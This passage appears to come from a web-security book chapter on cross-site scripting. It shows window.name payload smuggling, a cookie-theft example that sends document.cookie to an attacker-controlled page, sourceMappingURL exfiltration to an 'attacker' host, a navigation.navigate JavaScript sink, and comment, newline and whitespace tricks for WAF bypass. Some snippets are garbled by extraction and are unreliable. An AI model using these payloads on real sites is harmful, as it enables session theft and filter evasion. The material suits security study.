    # Window name payloads


    Another common trick in the XSS arsenal is to use window.name to smuggle payloads
    to other domains or pages. Browsers are crashing down on this by removing the
    name for top-level cross navigations but this technique still works fine using
    iframes:


    ```

    <iframe src=//target name=alert(1)></iframe>

    <!--target-->

    <script>eval(name)</script>

    ```


    You can even smug cookies in too and retrieve them when the page is navigated
    to a page you control. For example:


    ```

    <scriptname=document.cookie</script>

    <a href="//attacker">test</a>

    <!--Attacker controlled page-->

    <script>fetch(''/collect-cookie'', {method: "post",body:name})</script>

    ```


    # Source maps to create pingsbacks


    Source maps are a cool way of making a DNS/HTTP interaction that you could use
    to exfiltrate data. If you have an injection inside a single line comment, you
    can use a source map request to exfiltrate the data after the comment. There is
    one problem though, it requires that the devctools open. You can use this to your
    advantage if you get a ping that can be sure your victim has devctools open. Here
    is how it works:


    ```

    // sourceMappingURL=https://attacker?

    ```


    When this is evaluated a request will be sent to the source map, this also works
    in the eval() function and others. Note you''ll have to use an OOB (Out-of-Band)
    tool such as the Burp Collaborator or Interactsh. This is because devctools doesn''t
    show the request in the network tab.


    # New redirection sink


    Chrome introduced a new way of causing a client-side redirect: navigation.navigate().
    Using this method it''s possible to specify a JavaScript URL which you can call
    arbitrary JavaScript too. To use it just call the navigate() method with a JavaScript
    or HTTP URL:'
  - "[PAGE 70]\n\nChapter eight - XSS\n\n66\n\n```\nnavigation.navigate('javascript:alert(1337)')\n\
    ```\n\n# # JavaScript comments\n\nJavaScript supports a whole range of comment\
    \ syntax. There are a few different types of single line comments:\n\n```\n! \n\
    //--\n<-\n-->\n```\n\nThe first example will only work if it's the first JavaScript\
    \ statement, if it appears elsewhere a syntax error will be raised. The second\
    \ example is the standard way of creating a string comment and can appear anywhere\
    \ in the expression or statement (provided it's not inside asterix). Next, the\
    \ third example behaves just like the previous comment and was added in the early\
    \ days of the web when scripts weren't supported by all the browsers but it is\
    \ still supported today.\n\nFinally the closing HTML comment is allowed in JavaScript\
    \ and it acts like a single line comment if used at the start, however because\
    \ it can potentially be used as decrement and greater operation isn't supported\
    \ anywhere inside an expression/statement. Each single line comment is active\
    \ until a new line character is encountered; this means a carriage return, a new\
    \ line feed, paragraph separator or separator.\n\nAs far as I'm aware JavaScript\
    \ only supports one type of multiline comment with forward slash and asterix:\n\
    \n```\n/*\nI'm a multiline comment\n*/\n```\n\n# # New lines\n\nJavaScript supports\
    \ multiple characters for separating statements. This includes carriage return,\
    \ new line feed, and paragraph separator. This can be demonstrated as follows:\n\
    \n```\neval('//alert(1337)');//carriage return\neval('//alert(1337)');//line feed\n\
    eval('/\\u2028alert(1337)');//line separator\neval('/\\u2029alert(1337)');//paragraph\
    \ separator\n```\n\nIf you have injection inside a single line comment and the\
    \ WAF is blocking a new line then it's worth trying the alternative characters\
    \ mentioned above."
- md: "## Whitespace\n\nThere are many whitespace characters in JavaScript and using\
    \ them can help bypass dumb WAF that is using regular expressions to look for\
    \ certain keywords like. Here's a simple way to test for whitespace (note this\
    \ will include new lines, carriage return and line/paragraph separators):\n\n\
    ```javascript\nlog=[];\nfunction funct(){\n  for(let i=0;i<=0x10ffff;i++){\n \
    \   try{\n      eval(`func${String.fromCodePoint(i)}`);\n      log.push(i);\n\
    \    } catch(e){}\n  }\n}\nconsole.log(log);\n// 9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279\n\
